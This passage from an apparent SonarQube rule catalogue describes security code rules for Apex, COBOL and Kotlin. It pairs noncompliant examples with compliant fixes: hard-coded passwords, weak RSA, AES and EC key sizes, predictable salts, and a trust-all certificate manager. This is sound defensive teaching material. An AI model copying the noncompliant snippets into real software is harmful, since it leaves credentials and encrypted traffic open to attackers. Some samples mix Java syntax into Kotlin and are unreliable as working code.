<h2>Sensitive Code Example</h2>
<pre>
String password = 'xxxx'; // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
String password = retrievePassword();
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li>
  <li> <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication">OWASP Top 10 2017 Category A2</a> - Broken Authentication
  </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/798">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/259">MITRE, CWE-259</a> - Use of Hard-coded Password </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
  <li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD">Hard Coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=apex:S5378">
              apex:S5378
            </a>
          </td>
          <td>
            <details>
              <p>By default Apex code executes without checking permissions. Hence the code will not enforce field level security, sharing rules and user
permissions during execution of Apex code in Triggers, Classes and Controllers. This creates the risk that unauthorized users may get access to
sensitive data records or fields.</p>
<p>It is possible to specify different level of sharing via the keywords "with sharing", "without sharing" or "inherited sharing". The last two should
be used very carefully as they can create security risks.</p>
<p>This rule raises an issue whenever a DML, SOSL or SOQL query is executed in a class marked as <code>without sharing</code> or <code>inherited
sharing</code>.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> this code gives access to or modifies restricted records. </li>
  <li> this code may be executed by users who shouldn’t have access to those records. </li>
  <li> if the class is marked as <code>inherited sharing</code>, it may be called by a class marked as <code>without sharing</code>. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Use <code>with sharing</code> whenever possible. </li>
  <li> Use <code>without sharing</code> only after checking that the code is not accessible to unauthorized users. </li>
  <li> Use <code>inherited sharing</code> only when all calling <code>without sharing</code> classes are safe. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
public without sharing class MyClass {
  List&lt;List&lt;SObject&gt;&gt; sList = [FIND 'TEST' IN ALL FIELDS
                                      RETURNING Case(Name), Contact(FirstName,LastName)]; // Sensitive
}

public inherited sharing class MyClass {
  List&lt;Case&gt; lstCases = new List&lt;Case&gt;();
  for(Case c:[SELECT Id, Status FROM Case WHERE Status = 'In Progress']){ // Sensitive
      c.Status = 'Closed';
      lstCasesToBeUpdated.add(c);
  }
  Update lstCasesToBeUpdated; // Sensitive
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public with sharing class MyClass { // Compliant
  List&lt;Case&gt; lstCases = new List&lt;Case&gt;();
  for(Case c:[SELECT Id FROM Case WHERE Status = 'In Progress']){
      // ...
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://developer.salesforce.com/docs/atlas.en-us.apexcode.meta/apexcode/apex_classes_keywords_sharing.htm">Using the with sharing,
  without sharing, and inherited sharing Keywords</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=apex:S1313">
              apex:S1313
            </a>
          </td>
          <td>
            <details>
              <p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5901">CVE-2006-5901</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3725">CVE-2005-3725</a> </li>
</ul>
<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always
have the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,
delivery, and deployment:</p>
<ul>
  <li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li>
  <li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li>
</ul>
<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially
sensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to
bypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which
will increase an attack’s impact.</p>
<h2>Ask Yourself Whether</h2>
<p>The disclosed IP address is sensitive, e.g.:</p>
<ul>
  <li> Can give information to an attacker about the network topology. </li>
  <li> It’s a personal (assigned to an identifiable person) IP address. </li>
</ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar
approach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having
to rebuild the software.</p>
<h2>Sensitive Code Example</h2>
<pre>
String ip = '192.168.12.42'; // Sensitive
String clientIp = ApexPages.currentPage().getHeaders().get(‘True-Client-IP’);
Boolean isKnown = ip.equals(clientIp);
</pre>
<h2>Compliant Solution</h2>
<pre>
StaticResource sr= [SELECT ip_address FROM StaticResource WHERE Name = 'configuration' LIMIT 1]; // Compliant
String ip_address = sr.body.toString();
String clientIp = ApexPages.currentPage().getHeaders().get(‘True-Client-IP’);
Boolean isKnown = ip_address.equals(clientIp);
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul>
  <li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li>
  <li> Broadcast address 255.255.255.255 </li>
  <li> Non-routable address 0.0.0.0 </li>
  <li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href="http://www.oid-info.com/introduction.htm">often match
  Object Identifiers</a> (OID) </li>
  <li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a
  href="https://datatracker.ietf.org/doc/html/rfc5737">RFC 5737</a> </li>
  <li> Addresses in the range 2001:db8::/32, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc3849">RFC
  3849</a> </li>
</ul>
<h2>See</h2>
<ul>
  <li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li>
  <li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cobol:S1686">
              cobol:S1686
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Defining a subprogram to be called at runtime is possible but ill-advised. This extremely powerful feature can quite easily be misused, and even
when used correctly, it highly increases the overall complexity of the program, and makes it impossible before runtime to know exactly what will be
executed. Therefore defining the subprogram to be called at runtime is a feature that should be avoided.</p>
<h3>Noncompliant code example</h3>
<pre>
MOVE SOMETHING TO MY_SUBPROG.
...
CALL MY_SUBPROG.
</pre>
<h3>Compliant solution</h3>
<pre>
01 MY_SUBPROG PIC X(10) VALUE "SUB123".
....
CALL MY_SUBPROG.
</pre>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cobol:S1685">
              cobol:S1685
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href='/organizations/sopra-steria/rules?open=cobol%3AS4507&rule_key=cobol%3AS4507'>S4507</a> instead.</p>
<h2>Why is this an issue?</h2>
<p>Debug statements (ones with 'D' or 'd' in the indicator area) should not be executed in production, but the <code>WITH DEBUGGING MODE</code> clause
activates all debug lines, which could expose sensitive information to attackers. Therefore the <code>WITH DEBUGGING MODE</code> clause should be
removed.</p>
<h3>Noncompliant code example</h3>
<pre>
SOURCE-COMPUTER. IBM-370 WITH DEBUGGING MODE.
</pre>
<h3>Compliant solution</h3>
<pre>
SOURCE-COMPUTER. IBM-370.
</pre>
<h2>Resources</h2>
<ul>
  <li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/489">MITRE, CWE-489</a> - Active Debug Code </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cobol:COBOL.DisplayStatementUsageCheck">
              cobol:COBOL.DisplayStatementUsageCheck
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>The <code>DISPLAY</code> statement outputs data to standard out or some other destination and could reveal sensitive information. Therefore, it
should be avoided.</p>
<h3>Noncompliant code example</h3>
<pre>
DISPLAY "hello world"  *&gt; Noncompliant
</pre>
<h2>Resources</h2>
<ul>
  <li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/489">MITRE, CWE-489</a> - Active Debug Code </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cobol:S3394">
              cobol:S3394
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>The <code>ACCEPT</code> keyword does no editing or error checking of the data it stores, therefore its use can be dangerous. For this reason,
<code>ACCEPT</code> should be avoided.</p>
<h3>Noncompliant code example</h3>
<pre>
 01 USER-INPUT PIC X(4).

  GET-USER-INPUT.
       MOVE 'N' TO WS-NUMERIC.
       PERFORM UNTIL WS-NUMERIC = 'Y'
           DISPLAY 'ENTER YOUR 4 DIGIT RECORD NUMBER: ' NO ADVANCING
           ACCEPT USER-RECORD *&gt; Noncompliant
</pre>
<h3>Exceptions</h3>
<p>This rule ignores uses of <code>ACCEPT FROM</code> with date/time-related inputs.</p>
<h2>Resources</h2>
<ul>
  <li> <a href="https://owasp.org/Top10/A03_2021-Injection/">OWASP Top 10 2021 Category A3</a> - Injection </li>
  <li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">OWASP Top 10 2017 Category A1</a> - Injection </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kotlin:S2053">
              kotlin:S2053
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability increases the likelihood that attackers are able to compute the cleartext of password hashes.</p>
<h2>Why is this an issue?</h2>
<p>During the process of password hashing, an additional component, known as a "salt," is often integrated to bolster the overall security. This salt,
acting as a defensive measure, primarily wards off certain types of attacks that leverage pre-computed tables to crack passwords.</p>
<p>However, potential risks emerge when the salt is deemed insecure. This can occur when the salt is consistently the same across all users or when it
is too short or predictable. In scenarios where users share the same password and salt, their password hashes will inevitably mirror each other.
Similarly, a short salt heightens the probability of multiple users unintentionally having identical salts, which can potentially lead to identical
password hashes. These identical hashes streamline the process for potential attackers to recover clear-text passwords. Thus, the emphasis on
implementing secure, unique, and sufficiently lengthy salts in password-hashing functions is vital.</p>
<h3>What is the potential impact?</h3>
<p>Despite best efforts, even well-guarded systems might have vulnerabilities that could allow an attacker to gain access to the hashed passwords.
This could be due to software vulnerabilities, insider threats, or even successful phishing attempts that give attackers the access they need.</p>
<p>Once the attacker has these hashes, they will likely attempt to crack them using a couple of methods. One is brute force, which entails trying
every possible combination until the correct password is found. While this can be time-consuming, having the same salt for all users or a short salt
can make the task significantly easier and faster.</p>
<p>If multiple users have the same password and the same salt, their password hashes would be identical. This means that if an attacker successfully
cracks one hash, they have effectively cracked all identical ones, granting them access to multiple accounts at once.</p>
<p>A short salt, while less critical than a shared one, still increases the odds of different users having the same salt. This might create clusters
of password hashes with identical salt that can then be attacked as explained before.</p>
<p>With short salts, the probability of a collision between two users' passwords and salts couple might be low depending on the salt size. The shorter
the salt, the higher the collision probability. In any case, using longer, cryptographically secure salt should be preferred.</p>
<h2>How to fix it in Java SE</h2>
<h3>Code examples</h3>
<p>The following code contains examples of hard-coded salts.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import javax.crypto.spec.PBEParameterSpec

fun hash() {
    val salt = "salty".toByteArray()
    val cipherSpec = PBEParameterSpec(salt, 10000) // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import java.security.SecureRandom
import javax.crypto.spec.PBEParameterSpec

fun hash() {
    val random = SecureRandom()
    val salt = ByteArray(16)
    random.nextBytes(salt)
    val cipherSpec = PBEParameterSpec(salt, 10000)
}
</pre>
<h3>How does this work?</h3>
<p>This code ensures that each user’s password has a unique salt value associated with it. It generates a salt randomly and with a length that
provides the required security level. It uses a salt length of at least 16 bytes (128 bits), as recommended by industry standards.</p>
<p>Here, the compliant code example ensures the salt is random and has a sufficient length by calling the <code>nextBytes</code> method from the
<code>SecureRandom</code> class with a salt buffer of 16 bytes. This class implements a cryptographically secure pseudo-random number generator.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">OWASP</a> Top 10:2021 A02:2021 - Cryptographic Failures </li>
  <li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">OWASP</a> - Top 10 2017 - A03:2017 - Sensitive Data
  Exposure </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/759">CWE</a> - CWE-759: Use of a One-Way Hash without a Salt </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/760">CWE</a> - CWE-760: Use of a One-Way Hash with a Predictable Salt </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kotlin:S4426">
              kotlin:S4426
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection </li>
  <li> Security during transmission or on storage devices </li>
  <li> Data integrity, general trust, and authentication </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>In today’s cryptography, the length of the <strong>key</strong> directly affects the security level of cryptographic algorithms.</p>
<p>Note that depending on the algorithm, the term <strong>key</strong> refers to a different mathematical property. For example:</p>
<ul>
  <li> For RSA, the key is the product of two large prime numbers, also called the <strong>modulus</strong>. </li>
  <li> For AES and Elliptic Curve Cryptography (ECC), the key is only a sequence of randomly generated bytes.
    <ul>
      <li> In some cases, AES keys are derived from a master key or a passphrase using a Key Derivation Function (KDF) like PBKDF2 (Password-Based Key
      Derivation Function 2) </li>
    </ul>  </li>
</ul>
<p>If an application uses a key that is considered short and <strong>insecure</strong>, the encrypted data is exposed to attacks aimed at getting at
the plaintext.</p>
<p>In general, it is best practice to expect a breach: that a user or organization with malicious intent will perform cryptographic attacks on this
data after obtaining it by other means.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in Java Cryptographic Extension</h2>
<h3>Code examples</h3>
<p>The following code examples either explicitly or implicitly generate keys. Note that there are differences in the size of the keys depending on the
algorithm.</p>
<p>Due to the mathematical properties of the algorithms, the security requirements for the key size vary depending on the algorithm.<br> For example,
a 256-bit ECC key provides about the same level of security as a 3072-bit RSA key and a 128-bit symmetric key.</p>
<h4>Noncompliant code example</h4>
<p>Here is an example of a private key generation with RSA:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
import java.security.KeyPairGenerator;
import java.security.NoSuchAlgorithmException;

fun main(args: Array&lt;String&gt;) {
    try {
        val keyPairGenerator = KeyPairGenerator.getInstance("RSA");
        keyPairGenerator.initialize(1024); // Noncompliant

    } catch (e: NoSuchAlgorithmException) {
        // ...
    }
}
</pre>
<p>Here is an example of a private key generation with AES:</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
import java.security.KeyGenerator;
import java.security.NoSuchAlgorithmException;

fun main(args: Array&lt;String&gt;) {
    try {
        val keyGenerator = KeyGenerator.getInstance("AES");
        keyGenerator.initialize(64); // Noncompliant

    } catch (e: NoSuchAlgorithmException) {
        // ...
    }
}
</pre>
<p>Here is an example of an Elliptic Curve (EC) initialization. It implicitly generates a private key whose size is indicated in the algorithm
name:</p>
<pre data-diff-id="3" data-diff-type="noncompliant">
import java.security.KeyPairGenerator;
import java.security.NoSuchAlgorithmException;
import java.security.InvalidAlgorithmParameterException;
import java.security.spec.ECGenParameterSpec;

fun main(args: Array&lt;String&gt;) {
    try {
        val keyPairGenerator  = KeyPairGenerator.getInstance("EC");
        val ellipticCurveName = new ECGenParameterSpec("secp112r1"); // Noncompliant
        keyPairGenerator.initialize(ellipticCurveName);

    } catch (e: NoSuchAlgorithmException) {
        // ...
    } catch (e: InvalidAlgorithmParameterException) {
        // ...
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import java.security.KeyPairGenerator;
import java.security.NoSuchAlgorithmException;

fun main(args: Array&lt;String&gt;) {
    try {
        val keyPairGenerator = KeyPairGenerator.getInstance("RSA");
        keyPairGenerator.initialize(2048);

    } catch (e: NoSuchAlgorithmException) {
        // ...
    }
}
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
import java.security.KeyPairGenerator;
import java.security.NoSuchAlgorithmException;

public static void main(String[] args) {
    try {
        val keyPairGenerator = KeyPairGenerator.getInstance("AES");
        keyPairGenerator.initialize(128);

    } catch (e: NoSuchAlgorithmException) {
        // ...
    }
}
</pre>
<pre data-diff-id="3" data-diff-type="compliant">
import java.security.KeyPairGenerator;
import java.security.NoSuchAlgorithmException;
import java.security.InvalidAlgorithmParameterException;
import java.security.spec.ECGenParameterSpec;

public static void main(String[] args) {
    try {
        val keyPairGenerator  = KeyPairGenerator.getInstance("EC");
        val ellipticCurveName = new ECGenParameterSpec("secp256r1");
        keyPairGenerator.initialize(ellipticCurveName);

    } catch (e: NoSuchAlgorithmException) {
        // ...
    } catch (e: InvalidAlgorithmParameterException) {
        // ...
    }
}
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic community.</p>
<p>The appropriate choices are the following.</p>
<h4>RSA (Rivest-Shamir-Adleman) and DSA (Digital Signature Algorithm)</h4>
<p>The security of these algorithms depends on the difficulty of attacks attempting to solve their underlying mathematical problem.</p>
<p>In general, a minimum key size of <strong>2048</strong> bits is recommended for both.</p>
<h4>AES (Advanced Encryption Standard)</h4>
<p>AES supports three key sizes: 128 bits, 192 bits and 256 bits. The security of the AES algorithm is based on the computational complexity of trying
all possible keys.<br> A larger key size increases the number of possible keys and makes exhaustive search attacks computationally infeasible.
Therefore, a 256-bit key provides a higher level of security than a 128-bit or 192-bit key.</p>
<p>Currently, a minimum key size of <strong>128 bits</strong> is recommended for AES.</p>
<h4>Elliptic Curve Cryptography (ECC)</h4>
<p>Elliptic curve cryptography is also used in various algorithms, such as ECDSA, ECDH, or ECMQV. The length of keys generated with elliptic curve
algorithms are mentioned directly in their names. For example, <code>secp256k1</code> generates a 256-bits long private key.</p>
<p>Currently, a minimum key size of <strong>224 bits</strong> is recommended for EC algorithms.</p>
<h3>Going the extra mile</h3>
<h4>Pre-Quantum Cryptography</h4>
<p>Encrypted data and communications recorded today could be decrypted in the future by an attack from a quantum computer.<br> It is important to keep
in mind that NIST-approved digital signature schemes, key agreement, and key transport may need to be replaced with secure quantum-resistant (or
"post-quantum") counterpart.</p>
<p>Thus, if data is to remain secure beyond 2030, proactive measures should be taken now to ensure its safety.</p>
<p><a href="https://www.enisa.europa.eu/publications/post-quantum-cryptography-current-state-and-quantum-mitigation">Learn more here</a>.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode">Microsoft, Timing vulnerabilities with CBC-mode
  symmetric decryption using padding</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack">Wikipedia, Padding Oracle Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack">Wikipedia, Chosen-Ciphertext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack">Wikipedia, Chosen-Plaintext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Semantic_security">Wikipedia, Semantically Secure Cryptosystems</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding">Wikipedia, OAEP</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode">Wikipedia, Galois/Counter Mode</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li>
  <li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li>
  <li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li>
  <li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li>
  <li> <a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf">NIST 800-131A</a> - Recommendation for Transitioning the
  Use of Cryptographic Algorithms and Key Lengths* <a href="https://cwe.mitre.org/data/definitions/326">MITRE, CWE-326</a> - Inadequate Encryption
  Strength </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/327">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/hDdGBQ">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kotlin:S4830">
              kotlin:S4830
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible that an encrypted communication is intercepted.</p>
<h2>Why is this an issue?</h2>
<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them. The role
of certificate validation in this process is to ensure that a system is indeed the one it claims to be, adding an extra layer of trust and
security.</p>
<p>When certificate validation is disabled, the client skips this critical check. This creates an opportunity for attackers to pose as a trusted
entity and intercept, manipulate, or steal the data being transmitted.</p>
<h3>What is the potential impact?</h3>
<p>Establishing trust in a secure way is a non-trivial task. When you disable certificate validation, you are removing a key mechanism designed to
build this trust in internet communication, opening your system up to a number of potential threats.</p>
<h4>Identity spoofing</h4>
<p>If a system does not validate certificates, it cannot confirm the identity of the other party involved in the communication. An attacker can
exploit this by creating a fake server and masquerading it as a legitimate one. For example, they might set up a server that looks like your bank’s
server, tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect
any data your system sends to them, potentially leading to significant data breaches.</p>
<h4>Loss of data integrity</h4>
<p>When TLS certificate validation is disabled, the integrity of the data you send and receive cannot be guaranteed. An attacker could modify the data
in transit, and you would have no way of knowing. This could range from subtle manipulations of the data you receive to the injection of malicious
code or malware into your system. The consequences of such breaches of data integrity can be severe, depending on the nature of the data and the
system.</p>
<h2>How to fix it in Java Cryptographic Extension</h2>
<h3>Code examples</h3>
<p>The following code contains examples of disabled certificate validation.</p>
<p>The certificate validation gets disabled by overriding <code>X509TrustManager</code> with an empty implementation. It is highly recommended to use
the original implementation.</p>
<h4>Noncompliant code example</h4>
<pre>
val trustAllCerts = arrayOf&lt;TrustManager&gt;(object : X509TrustManager {
  @Throws(CertificateException::class)
  override fun checkClientTrusted(chain: Array&lt;java.security.cert.X509Certificate&gt;, authType: String) {
  } // Noncompliant

  @Throws(CertificateException::class)
  override fun checkServerTrusted(chain: Array&lt;java.security.cert.X509Certificate&gt;, authType: String) {
  } // Noncompliant

  override fun getAcceptedIssuers(): Array&lt;java.security.cert.X509Certificate&gt; {
   return arrayOf()
  }
})
</pre>
<h3>How does this work?</h3>
<p>Addressing the vulnerability of disabled TLS certificate validation primarily involves re-enabling the default validation.</p>
<p>To avoid running into problems with invalid certificates, consider the following sections.</p>
<h4>Using trusted certificates</h4>
<p>If possible, always use a certificate issued by a well-known, trusted CA for your server. Most programming environments come with a predefined list
of trusted root CAs, and certificates issued by these authorities are validated automatically. This is the best practice, and it requires no
additional code or configuration.</p>
<h4>Working with self-signed certificates or non-standard CAs</h4>
<p>In some cases, you might need to work with a server using a self-signed certificate, or a certificate issued by a CA not included in your trusted
roots. Rather than disabling certificate validation in your code, you can add the necessary certificates to your trust store.</p>
<p>Here is a sample command to import a certificate to the Java trust store:</p>
<pre>
keytool -import -alias myserver -file myserver.crt -keystore cacerts
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li>
  <li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li>
  <li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li>
  <li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li>
  <li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication">OWASP Mobile Top 10 2016 Category M3</a> - Insecure
  Communication </li>
  <li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements">Mobile AppSec Verification
  Standard</a> - Network Communication Requirements </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/295">MITRE, CWE-295</a> - Improper Certificate Validation </li>
  <li> <a
  href="https://wiki.sei.cmu.edu/confluence/display/java/MSC61-J.+Do+not+use+insecure+or+weak+cryptographic+algorithms">https://wiki.sei.cmu.edu/confluence/display/java/MSC61-J.+Do+not+use+insecure+or+weak+cryptographic+algorithms</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kotlin:S5527">
              kotlin:S5527
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability allows attackers to impersonate a trusted host.</p>
<h2>Why is this an issue?</h2>
<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them. In this
process, the role of hostname validation, combined with certificate validation, is to ensure that a system is indeed the one it claims to be, adding
an extra layer of trust and security.</p>
<p>When hostname validation is disabled, the client skips this critical check. This creates an opportunity for attackers to pose as a trusted entity
and intercept, manipulate, or steal the data being transmitted.</p>
<p>To do so, an attacker would obtain a valid certificate authenticating <code>example.com</code>, serve it using a different hostname, and the
application code would still accept it.</p>
<h3>What is the potential impact?</h3>
<p>Establishing trust in a secure way is a non-trivial task. When you disable hostname validation, you are removing a key mechanism designed to build
this trust in internet communication, opening your system up to a number of potential threats.</p>
<h4>Identity spoofing</h4>
<p>If a system does not validate hostnames, it cannot confirm the identity of the other party involved in the communication. An attacker can exploit
this by creating a fake server and masquerading it as a legitimate one. For example, they might set up a server that looks like your bank’s server,
tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect any data
your system sends to them, potentially leading to significant data breaches.</p>
<h2>How to fix it in OkHttp</h2>
<h3>Code examples</h3>
<p>The following code contains examples of disabled hostname validation.</p>
